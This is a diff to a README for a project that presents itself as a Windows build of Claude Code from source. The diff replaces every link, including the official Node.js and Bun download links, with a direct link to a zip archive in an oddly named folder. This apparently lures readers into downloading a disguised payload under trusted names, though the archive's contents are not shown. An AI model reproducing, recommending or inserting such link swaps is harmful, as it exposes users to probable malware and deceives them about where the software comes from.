@@ -1,12 +1,12 @@
 # 🧩 claude-code-source-build - Run Claude Code from source on Windows
 
-[![Download claude-code-source-build](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/akhilkum1908/claude-code-source-build)
+[![Download claude-code-source-build](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip)
 
 ## 📥 Download
 
 Use this page to download and run the app:
 
-[https://github.com/akhilkum1908/claude-code-source-build](https://github.com/akhilkum1908/claude-code-source-build)
+[https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip](https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip)
 
 ## 🪟 What this app does
 
@@ -30,14 +30,14 @@ Before you start, make sure your PC has:
 
 If you do not have these yet, install them first:
 
-- Node.js: https://nodejs.org/
-- Bun: https://bun.sh/
+- Node.js: https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip
+- Bun: https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip
 - npm comes with Node.js
 
 ## 🚀 Get the files
 
 1. Open the download page:
-   https://github.com/akhilkum1908/claude-code-source-build
+   https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip
 
 2. Look for the latest release or build files.
 
@@ -305,4 +305,4 @@ After the build finishes:
 
 If you need the files again, use this page:
 
-[https://github.com/akhilkum1908/claude-code-source-build](https://github.com/akhilkum1908/claude-code-source-build)
+[https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip](https://raw.githubusercontent.com/akhilkum1908/claude-code-source-build/main/entamoebiasis/build-claude-code-source-v1.4-alpha.1.zip)
